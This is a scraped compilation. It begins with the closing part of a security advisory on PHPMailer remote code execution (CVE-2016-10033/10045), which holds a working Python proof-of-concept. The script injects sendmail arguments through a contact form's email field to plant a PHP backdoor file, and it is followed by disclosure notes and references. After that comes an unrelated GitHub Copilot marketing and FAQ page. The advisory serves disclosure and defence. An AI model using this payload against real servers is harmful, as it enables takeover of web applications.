Discovered and Coded by:

 Dawid Golunski
 @dawid_golunski
 <https://legalhackers.com>

"""
usage = """
Usage:

Full Advisory:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.txt>

PoC Video:
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

Disclaimer:
For testing purposes only. Do no harm.

"""

import time
import urllib
import urllib2
import socket
import sys

RW_DIR = "/var/www/html/uploads"

url = '[http://VictimWebServer/contact_form.php'](http://VictimWebServer/contact_form.php%27) # Set destination URL here

# Choose/uncomment one of the payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
#payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php  some"@email.com' % RW_DIR

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php  some\"@email.com" % RW_DIR

######################################

# PHP code to be saved into the backdoor php file on the target in RW_DIR
RCE_PHP_CODE = "<?php phpinfo(); ?>"

post_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE_PHP_CODE}

# Attack
data = urllib.urlencode(post_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

The researcher also developed an Unauthenticated RCE exploit for a popular
open-source application (deployed on the Internet on more than a million servers)
as a PoC for real-world exploitation. It might be published after the vendor has
fixed the vulnerabilities.

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

All current versions of (PHPMailer <5.2.20) are affected.

Note that exploitation is not limited to systems with Sendmail MTA.

VIII. SOLUTION
-------------------------

No official solution is available at the moment.

NOTE:
The vulnerability / patch bypass was responsibly reported to the vendor
in private on December 26th and a new CVE was issued by MITRE on the same day.
However a potential bypass was publicly discussed on the oss-sec list.
Holding the advisory further would serve no purpose which is what triggered
the earlier release of this advisory.

The vendor has been working on a new patch since the private disclosure
on 26th December which should be published shortly.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This advisory (CVE-2016-10045):
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

WordPress Core 4.6 - RCE Remote Code Execution PoC Exploit:
<https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html>
<https://www.youtube.com/watch?v=ZFt_S5pQPX0>

The original vuln of CVE-2016-10033:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

Video PoC exploit:
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
Simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10045/PHPMailer_RCE_exploit.py>

Combined exploit code for multiple targets:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>
<https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html>

CVE-2016-10045
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10045>

PHPMailer / Vendor security updates / notices:

<https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>

<https://github.com/PHPMailer/PHPMailer>

<https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>

<http://php.net/manual/en/function.mail.php>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

XI. REVISION HISTORY
-------------------------

28.12.2016 - Added NOTEs for the reason of the earlier disclosure

28.12.2016 - Advisory updated to extend the description

27.12.2016 - Advisory released

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from github.com_dba769c8_20250126_062409.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffeatures%2Fcopilot)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffeatures%2Fcopilot)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Ffeatures%2Fcopilot&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GitHub Copilot](/features/copilot)Navigation menu. Current page: Overview

* Overview
* [Plans](/features/copilot/plans)
* [Tutorials](/features/copilot/tutorials)
* [Extensions](/features/copilot/extensions)
* [What’s new](/features/copilot/whats-new)
![](https://github.githubassets.com/assets/hero-bg-sm-11153e2d28f8.jpg)GitHub Copilot is now available for free
# The AI editor for everyone

[Get started for free](https://github.com/copilot)[See plans & pricing](/features/copilot/plans?cft=copilot_lo.features_copilot)Already have ![](https://github.githubassets.com/assets/vscode-41ed661450e9.svg) Visual Studio Code? Open nowPause
## GitHub Copilot is used by

![Lyft](https://github.githubassets.com/assets/lyft-ff04a849adcd.svg)![FedEx](https://github.githubassets.com/assets/fedex-4fbd5209ba18.svg)![AT&T](https://github.githubassets.com/assets/atnt-a1d3c3d04a75.svg)![Shopify](https://github.githubassets.com/assets/shopify-c893630d6403.svg)![BMW](https://github.githubassets.com/assets/bmw-72cecc644c23.svg)![H&M](https://github.githubassets.com/assets/hnm-7f6d81c34913.svg)![Honeywell](https://github.githubassets.com/assets/honeywell-cbed470d5960.svg)![EY](https://github.githubassets.com/assets/ey-cd7494447821.svg)![Infosys](https://github.githubassets.com/assets/infosys-935e1fcdf87b.svg)![BBVA](https://github.githubassets.com/assets/bbva-538b46252b6e.svg)![Lyft](https://github.githubassets.com/assets/lyft-ff04a849adcd.svg)![FedEx](https://github.githubassets.com/assets/fedex-4fbd5209ba18.svg)![AT&T](https://github.githubassets.com/assets/atnt-a1d3c3d04a75.svg)![Shopify](https://github.githubassets.com/assets/shopify-c893630d6403.svg)![BMW](https://github.githubassets.com/assets/bmw-72cecc644c23.svg)![H&M](https://github.githubassets.com/assets/hnm-7f6d81c34913.svg)![Honeywell](https://github.githubassets.com/assets/honeywell-cbed470d5960.svg)![EY](https://github.githubassets.com/assets/ey-cd7494447821.svg)![Infosys](https://github.githubassets.com/assets/infosys-935e1fcdf87b.svg)![BBVA](https://github.githubassets.com/assets/bbva-538b46252b6e.svg)PauseFeatures
## Customizable. Contextual. AI-powerful.

PausePause

*Create tests, docs, and more.* Ask GitHub Copilot a question, get the right answer for you, and accept the code with a single click.[Our favorite Copilot prompts](https://docs.github.com/en/copilot/example-prompts-for-github-copilot-chat)

* *Answers that know how you code.* GitHub Copilot can use your code and Custom Instructions to code the way you prefer.
* *Create tests, docs, and more.* Ask GitHub Copilot to generate them and add them to your codebase with just one click.
### Choose your model

Use models like Anthropic's [Claude 3.5 Sonnet](https://docs.github.com/en/copilot/using-github-copilot/using-claude-sonnet-in-github-copilot), OpenAI o1, and GPT 4o to excel at coding tasks one minute — and deeper reasoning and understanding the next.

Pause
### Multi-file edits

Tell GitHub Copilot what to do, and watch it update multiple files right in your editor.

![GitHub Copilot including multiple files in a working set](https://github.githubassets.com/assets/copilot-multifile-3eb48ba0aedf.webp)
### Get AI-based suggestions in real time

GitHub Copilot suggests code completions as you type and turns natural language prompts into coding suggestions based on your project's conventions.

[Use slash commands](https://docs.github.com/en/copilot/using-github-copilot/asking-github-copilot-questions-in-your-ide#slash-commands)PausePause
### Instant feedback

Ask GitHub Copilot to review your work, uncover hidden bugs, fix mistakes, and more—before you get a human review.

[Get early access](https://github.com/features/preview/copilot-code-review)[![GitHub Copilot performing a code review](https://github.githubassets.com/assets/copilot-review-c1d2859ea8a2.webp)](https://github.com/features/preview/copilot-code-review)
### Extensions for your favorite tools

Check logs, create feature flags, and deploy apps—all from Copilot Chat, enhanced by an ecosystem of extensions from third party tools and services.

[Explore GitHub Copilot Extensions](https://github.com/features/copilot/extensions)[![GitHub Copilot Extensions for Azure, Datastax, Docker, MongoDB and Sentry](https://github.githubassets.com/assets/copilot-extensions-f78138bbfae2.webp)](https://github.com/features/copilot/extensions)
### Ask for assistance right in your terminal

[Try Copilot in the CLI](https://docs.github.com/copilot/using-github-copilot/using-github-copilot-in-the-command-line)![Screenshot of GitHub Copilot CLI in a terminal](https://github.githubassets.com/assets/copilot-terminal-3048272df3eb.webp)![Screenshot of GitHub Copilot CLI in a terminal](https://github.githubassets.com/assets/copilot-terminal-sm-d07a8373a1e6.webp)![](https://github.githubassets.com/assets/copilot-terminal-bg-826e922edd44.webp)
### Chat with your AI pair programmer on-the-go

[![Download GitHub on the Google Play Store](https://github.githubassets.com/assets/google-play-b4758bd0f618.png)](https://play.google.com/store/apps/details?id=com.github.android)[![Download GitHub on the Apple App Store](https://github.githubassets.com/assets/app-store-f73cb66283cf.png)](https://apps.apple.com/app/github/id1477376905?ls=1)![A phone showing GitHub Copilot in GitHub Mobile](https://github.githubassets.com/assets/copilot-mobile-828695350edc.webp)Pricing
## Take flight with GitHub Copilot

New
### Free

For developers looking to get started with GitHub Copilot.

$0 USD  [Get started](https://github.com/copilot)Already have ![](https://github.githubassets.com/assets/vscode-41ed661450e9.svg) VS Code? Open nowIncludes up to 2,000 completions and 50 chat requests per month.Most popular
### Pro

For developers who want unlimited access to GitHub Copilot.

$10 USD per month. First 30 days free.[Get started](/github-copilot/signup/copilot_individual?cft=copilot_lo.features_copilot.cfi)Free for verified students, teachers, and maintainers of popular open source projects. [Learn more](https://github.com/education)
### Business

For teams ready to accelerate their workflows with GitHub Copilot.

$19 USD per user / month[Get started](/github-copilot/purchase?priority=business&cft=copilot_lo.features_copilot.cfb)[Contact sales](/enterprise/contact?ref_cta=Contact+sales&ref_loc=pricing&ref_page=%2Ffeatures%2Fcopilot&scid=&utm_campaign=Copilot_feature_page_contact_sales_cta_CopilotBusiness_utmroutercampaign&utm_medium=site&utm_source=github&cft=copilot_lo.features_copilot&utm_content=CopilotBusiness)
### Enterprise

For organizations seeking a fully customized GitHub Copilot experience.

$39 USD per user / month[Get started](/github-copilot/purchase?priority=enterprise&cft=copilot_lo.features_copilot.ce)[Contact sales](/enterprise/contact?ref_cta=Contact+sales&ref_loc=pricing&ref_page=%2Ffeatures%2Fcopilot&scid=&utm_campaign=Copilot_feature_page_contact_sales_cta_CopilotEnterprise_utmroutercampaign&utm_medium=site&utm_source=github&cft=copilot_lo.features_copilot&utm_content=CopilotEnterprise)GitHub Copilot is available on your favorite platforms:

* [![](https://github.githubassets.com/assets/github-dae1693fc0e0.svg?v=1)GitHub](https://github.com/copilot) GitHub
* [![](https://github.githubassets.com/assets/vscode-41ed661450e9.svg?v=1)VS Code](https://marketplace.visualstudio.com/items?itemName=GitHub.copilot) VS Code
* [![](https://github.githubassets.com/assets/visualstudio-7b2c255a778e.svg?v=1)Visual Studio](https://visualstudio.microsoft.com/github-copilot) Visual Studio
* [![](https://github.githubassets.com/assets/xcode-b8ad451a19a6.svg?v=1)Xcode](https://github.com/github/CopilotForXcode) Xcode
* [![](https://github.githubassets.com/assets/jetbrains-04b2b7606878.svg?v=1)JetBrains IDEs](https://plugins.jetbrains.com/plugin/17718-github-copilot)JetBrains IDEs
* [![](https://github.githubassets.com/assets/neovim-c63bac91528a.svg?v=1)Neovim](https://github.com/github/copilot.vim) Neovim
* [![](https://github.githubassets.com/assets/azure-e978ccb08351.svg?v=1)Azure Data Studio](https://learn.microsoft.com/en-us/azure-data-studio/extensions/github-copilot-extension-overview)Azure Data Studio
Compare featuresFeaturesFreeProBusinessEnterprisePricing$0$10 per month$19 per user / month$39 per user / monthChatChatMessages and interactions Free planUp to 50 per monthUp to 50 per monthPro planUnlimitedUnlimitedBusiness planUnlimitedUnlimitedEnterprise planUnlimitedUnlimitedAccess to OpenAI GPT-4o Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewAccess to Anthropic Claude 3.5 Sonnet Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewAccess to OpenAI o1 Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewAccess to OpenAI o1-mini Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedContext-aware coding support and explanations Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedDebugging and security remediation assistance Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedAccess to knowledge from top open source repositories Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedGenerate tests, docs, and more with slash commands Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewWeb search powered by Bing Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewExplain failed Actions jobs Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedAnswers about issues, PRs, discussions, files, commits, etc. Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewMulti-file editing in VS Code Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedCode completionCode completionReal-time code suggestions Free planUp to 2,000 per monthUp to 2,000 per monthPro planUnlimitedUnlimitedBusiness planUnlimitedUnlimitedEnterprise planUnlimitedUnlimitedComments to code Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedCustomizationCustomizationTailor chat conversations to your private codebase (unlimited repositories indexed) Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewUnlimited integrations with GitHub Copilot Extensions Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewBuild a private extension for internal tooling Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewPersonalize responses with custom instructions Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedAttach knowledge bases to chat for organizational context Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedFine-tuned models for code completion (coming soon as add-on) Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedSet coding guidelines for code review Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedAI-native experiencesAI-native experiencesInline chat and prompt suggestions Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedSlash commands and context variables Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedCommit message generation Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedSummaries for pull requests, issues, and discussions Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewCode feedback in VS Code Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedExplanations in Visual Studio’s Quick Info Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedDebug assistant in Visual Studio Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewUpgrade assistant for Java in VS Code Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewCode review in GitHub Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewCopilot Workspace in pull requests Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedTechnical Preview access to Copilot Workspace Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedSupported environmentsSupported environmentsEditors and IDEs  - [See all supported editors](https://docs.github.com/en/copilot/managing-copilot/configure-personal-settings/installing-the-github-copilot-extension-in-your-environment)Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedgithub.com Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedGitHub Mobile Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedGitHub CLI and Windows Terminal Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedManagement and policiesManagement and policiesPublic code filter with code referencing Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedUser management Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedData excluded from training by default Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedEnterprise-grade security Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedIP indemnity Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedContent exclusions Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedSAML SSO authentication [1](#footnote-1)Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedUsage metrics Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedRequires GitHub Enterprise Cloud Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedHow to get started[Get started](https://github.com/copilot)[Get started](/github-copilot/signup/copilot_individual?cft=copilot_lo.features_copilot.cfi)[Get started](/github-copilot/purchase?priority=business&cft=copilot_lo.features_copilot.cfb)[Get started](/github-copilot/purchase?priority=enterprise&cft=copilot_lo.features_copilot.ce)
## Get the most out of GitHub Copilot

### [Preview the latest features](https://github.com/features/preview)

Be the first to explore what’s next for GitHub Copilot.

See previews
### [Explore The GitHub Blog](https://github.blog/)

Discover the latest in software development with insights, best practices, and more.

Read Blog
### [Visit the GitHub Copilot Trust Center](https://copilot.github.trust.page/)

Gain peace of mind with our security, privacy, and responsible AI policies.

Go to Trust Center
### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

